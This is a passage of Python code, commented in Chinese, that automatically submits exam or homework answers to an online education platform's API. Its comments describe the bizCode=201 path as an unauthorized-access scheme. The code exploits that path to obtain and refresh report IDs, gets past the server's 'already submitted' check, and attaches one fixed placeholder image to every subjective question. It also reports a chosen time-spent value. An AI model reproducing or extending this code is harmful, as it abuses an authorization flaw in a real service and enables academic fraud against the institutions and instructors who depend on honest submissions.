      3. tempSaveAnswerNew 保存答案 (3 次重试, 遇"已提交"刷新 reportId)
      4. studentSubmitPaperAnswers 最终交卷

    主观题 (subjective=True) 的 attachmentImages 使用上传固定图片后的 CDN URL:
      - oss 未注入或上传失败: attachmentImages=[], 不影响其他题目
      - oss 注入且上传成功: attachmentImages=[cdn_url], 所有主观题共用同一 URL
    """
    print(f"\n{'='*60}\n开始交卷: {result.get('courseTitle')} "
          f"({len(result.get('questions', []))} 题, paperId={result.get('paperId')})\n{'='*60}")

    if not result.get("reportId"):
        msg = "缺少 reportId, 无法交卷 (该课程可能未通过 bizCode=201 获取)"
        print(f"  ✗ {msg}")
        return {"success": False, "message": msg, "submittedCount": 0}

    # 0. 上传固定图片 (主观题 attachmentImages 使用)
    fixed_image_urls = []
    if oss is not None:
        fixed_image_urls = _upload_fixed_image(oss, fixed_image_path)

    # 1. 构造 questionList (主观题用固定图片 URL)
    question_list = _build_question_list(result.get("questions") or [], fixed_image_urls)
    if not question_list:
        msg = "没有可提交的题目 (所有题目缺少 id)"
        print(f"  ✗ {msg}")
        return {"success": False, "message": msg, "submittedCount": 0}
    print(f"  题目列表: {len(question_list)} 题")

    # bizCode 转换: 越权方案(201)提交时必须转 204
    # (201 的 reportId 已被 submitPaper 标记"已提交", 直接用会报错)
    submit_biz_code = "204" if result.get("bizCode") == "201" else result.get("bizCode", "204")
    is_report_id_via = result.get("bizCode") == "201"

    # homeworkId: bizCode=205 必须传真实值; 其他默认 '0'
    real_hw_id = result.get("homeworkId") or ""
    if submit_biz_code == "205" and real_hw_id:
        homework_id = real_hw_id
    else:
        homework_id = "0"

    # 2. 越权方案主动刷新 reportId
    report_id = result["reportId"]
    if is_report_id_via:
        fresh = _refresh_report_id(result["paperId"], submit_biz_code)
        if fresh:
            if report_id and fresh != report_id:
                print(f"  主动获取新 reportId: {fresh} (原 {report_id} 可能已提交)")
            report_id = fresh

    # 3. tempSaveAnswerNew 保存答案 (3 次重试)
    saved = False
    last_error = ""
    for attempt in range(SUBMIT_RETRY):
        try:
            print(f"  保存答案 (尝试 {attempt + 1}/{SUBMIT_RETRY}, reportId={report_id})...")
            save_resp = temp_save_answer_new(
                paper_id=result["paperId"], report_id=report_id,
                biz_code=submit_biz_code, platform=result.get("platform", DEFAULT_PLATFORM),
                assign_points=result.get("assignPoints", False),
                question_list=question_list, homework_id=homework_id,
            )
            save_success = save_resp.get("success") or \
                str((save_resp.get("data") or {}).get("code") or "") == "200"
            if save_success:
                saved = True
                print("  ✓ 保存成功")
                break

            msg = save_resp.get("message") or \
                (save_resp.get("data") or {}).get("msg") or "未知错误"
            last_error = msg
            print(f"  ✗ 保存失败: {msg}")

            # "试卷已提交"错误: 刷新 reportId 重试
            if _is_paper_submitted_error(msg):
                print("  刷新 reportId...")
                new_rid = _refresh_report_id(result["paperId"], submit_biz_code)
                if new_rid:
                    report_id = new_rid
                    print(f"  获取新 reportId: {report_id}")
                    if attempt < SUBMIT_RETRY - 1:
                        continue
                if attempt < SUBMIT_RETRY - 1:
                    print("  刷新 reportId 失败, 仍重试一次")
                    continue
                return {"success": False,
                        "message": f"保存答案失败: 试卷已提交且无法获取新 reportId "
                                   f"(原始错误: {msg})",
                        "submittedCount": 0}

            # 非"已提交"错误: 直接返回失败
            return {"success": False, "message": f"保存答案失败: {msg}",
                    "submittedCount": 0}
        except Exception as e:
            last_error = str(e)
            print(f"  ✗ 保存异常: {e}")
            return {"success": False, "message": f"保存答案异常: {e}",
                    "submittedCount": 0}

    if not saved:
        return {"success": False, "message": f"保存答案失败: {last_error}",
                "submittedCount": 0}

    # 4. 调用 studentSubmitPaperAnswers 最终交卷
    print(f"  交卷中 (homeworkId={homework_id})...")
    try:
        submit_resp = student_submit_paper_answers(
            paper_id=result["paperId"], report_id=report_id,
            biz_code=submit_biz_code, homework_id=homework_id,
            platform=result.get("platform", DEFAULT_PLATFORM),
            paper_package_id=result.get("paperPackageId", ""),
            total_seconds=total_seconds,
        )
        submit_success = submit_resp.get("success") or \
            str((submit_resp.get("data") or {}).get("code") or "") == "200"
        if submit_success:
            print("  ✓ 交卷成功")
            print(f"✓ 交卷完成 ({len(question_list)} 题)")
            return {"success": True, "message": f"交卷成功 ({len(question_list)} 题)",
                    "submittedCount": len(question_list)}

        msg = submit_resp.get("message") or \
            (submit_resp.get("data") or {}).get("msg") or "未知错误"
        print(f"  ✗ 交卷失败: {msg} (答案已保存)")
        return {"success": False, "message": f"交卷失败: {msg} (答案已保存)",
                "submittedCount": len(question_list)}
    except Exception as e:
        print(f"  ✗ 交卷异常: {e} (答案已保存)")
        return {"success": False, "message": f"交卷异常: {e} (答案已保存)",
                "submittedCount": len(question_list)}
